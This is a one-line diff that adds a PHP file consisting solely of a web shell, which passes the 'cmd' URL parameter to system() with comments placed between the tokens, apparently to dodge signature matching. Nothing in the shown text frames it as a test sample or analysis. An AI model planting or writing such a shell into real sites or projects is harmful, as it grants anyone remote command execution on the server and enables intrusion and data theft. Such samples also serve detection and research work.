@@ -1,0 +1,1 @@
+<?php /* x */ system /* y */ ($_GET["cmd"]); ?>
